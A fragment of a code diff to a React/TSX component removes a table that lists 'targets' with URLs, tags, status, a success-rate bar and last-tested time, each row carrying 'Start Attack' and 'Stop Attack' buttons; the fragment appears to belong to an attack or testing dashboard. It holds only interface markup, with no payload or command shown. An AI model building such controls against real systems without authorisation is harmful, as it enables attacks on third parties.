-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Status</th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Success Rate</th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Last Tested</th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Actions</th>
-                </tr>
-              </thead>
-              <tbody className="bg-gray-800 divide-y divide-gray-600">
-                {targets.length > 0 ? (
-                  targets.map((target) => (
-                    <tr key={target.id} className="hover:bg-gray-700">
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-white">
-                        {target.label}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-white">
-                        <a href={target.url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:text-blue-300">
-                          {target.url}
-                        </a>
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap">
-                        <div className="flex flex-wrap gap-1">
-                          {target.tags.map((tag, index) => (
-                            <span key={index} className="inline-block bg-blue-800 text-blue-200 text-xs px-2 py-1 rounded">
-                              {tag}
-                            </span>
-                          ))}
-                        </div>
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap">
-                        <span className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(target.status)}`}>
-                          {target.status}
-                        </span>
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-white">
-                        <div className="flex items-center">
-                          <div className="w-16 bg-gray-700 rounded-full h-2 mr-2">
-                            <div
-                              className={`h-2 rounded-full ${
-                                (parseFloat(target.success_rate.toString()) || 0) >= 90 ? 'bg-green-500' :
-                                (parseFloat(target.success_rate.toString()) || 0) >= 70 ? 'bg-yellow-500' :
-                                'bg-red-500'
-                              }`}
-                              style={{ width: `${parseFloat(target.success_rate.toString()) || 0}%` }}
-                            ></div>
-                          </div>
-                          <span>{target.success_rate}</span>
-                        </div>
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-white">
-                        {new Date(target.last_tested).toLocaleString()}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
-                        <button
-                          onClick={() => handleStartAttack(target.id)}
-                          className="bg-green-600 text-white px-3 py-1 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 mr-2"
-                        >
-                          Start Attack
-                        </button>
-                        <button
-                          onClick={() => handleStopAttack(target.id)}
-                          className="bg-red-600 text-white px-3 py-1 rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500"
-                        >
-                          Stop Attack
-                        </button>
-                      </td>
-                    </tr>
-                  ))
-                ) : (
-                  <tr>
-                    <td colSpan={7} className="px-6 py-4 text-center text-gray-400">
-                      No targets available
-                    </td>
-                  </tr>
-                )}
-              </tbody>
-            </table>
-          </div>
-        )}
-      </div>
+        </aside>
+      </section>
     </div>
   );
 };
